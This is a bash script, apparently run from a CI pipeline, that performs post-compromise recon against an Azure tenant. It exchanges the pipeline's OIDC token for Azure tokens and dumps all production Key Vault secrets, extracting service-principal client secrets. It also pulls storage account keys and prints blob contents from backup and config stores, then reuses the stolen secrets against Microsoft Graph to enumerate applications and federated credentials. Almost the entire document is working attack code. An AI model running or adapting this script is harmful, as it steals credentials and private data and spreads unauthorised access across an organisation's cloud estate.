#!/usr/bin/env bash
# v5 — RBAC recon trên kv-tbl-sec + storage blobs + Graph
set +e
TEN="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"
RG=rg-tbl-platform-prod-sea
SEC=kv-tbl-sec-x3euoz
PROD=kv-tbl-prod-x3euoz

TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${TOK}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

KV=$(tok_fed "https://vault.azure.net/.default")
ARM=$(tok_fed "https://management.azure.com/.default")

# --- SP list từ kv-tbl-prod
curl -sS -H "Authorization: Bearer $KV" "https://$PROD.vault.azure.net/secrets?api-version=7.4" > /tmp/l.json
: > /tmp/sps.txt
for ID in $(python3 -c "
import json;print('\n'.join(s['id'] for s in json.load(open('/tmp/l.json')).get('value',[])))"); do
  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
  python3 - "${ID##*/}" <<'PY' >> /tmp/sps.txt
import json,sys
try:
    v=json.loads(json.load(open("/tmp/s.json"))["value"])
    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
except Exception: pass
PY
done

echo "================ RBAC trên $SEC ================"
curl -sS -H "Authorization: Bearer $ARM" \
 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$SEC/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | head -c 3000; echo
echo "--- tất cả roleAssignments ở subscription"
curl -sS -H "Authorization: Bearer $ARM" \
 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | head -c 4000; echo

echo "================ STORAGE ================"
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "--- $SA"
  K=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
   "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
   | python3 -c "
import sys,json
try: print(json.load(sys.stdin)['keys'][0]['value'])
except Exception: print('')")
  if [ -z "$K" ]; then echo "  no key"; continue; fi
  echo "  got key"
  pip -q install azure-storage-blob >/dev/null 2>&1
  python3 - "$SA" "$K" <<'PY'
import sys
from azure.storage.blob import BlobServiceClient
sa,key=sys.argv[1],sys.argv[2]
svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key)
for c in svc.list_containers():
    print("  container:",c.name)
    cc=svc.get_container_client(c.name)
    for b in cc.list_blobs():
        print("    blob:",b.name,b.size)
        if b.size<300000:
            try: print("      ",cc.download_blob(b.name).readall()[:2000])
            except Exception as e: print("      err",e)
PY
done

echo "================ GRAPH ================"
while read -r NAME APPID SECRET; do
  [ -z "$APPID" ] && continue
  G=$(tok_sp "$APPID" "$SECRET" "https://graph.microsoft.com/.default")
  [ -z "$G" ] && continue
  R=$(curl -sS -H "Authorization: Bearer $G" "https://graph.microsoft.com/v1.0/applications?\$top=50&\$select=id,appId,displayName")
  echo "$R" | grep -q '"error"' && { echo "  $NAME: graph denied"; continue; }
  echo "  $NAME: GRAPH OK"; echo "$R" | head -c 2500; echo
  for AID in $(echo "$R" | python3 -c "
import sys,json
for a in json.load(sys.stdin).get('value',[]): print(a['id'])"); do
    echo "   --- fic $AID"
    curl -sS -H "Authorization: Bearer $G" \
      "https://graph.microsoft.com/v1.0/applications/$AID/federatedIdentityCredentials" | head -c 1200; echo
  done
done < /tmp/sps.txt
echo "================ DONE ================"
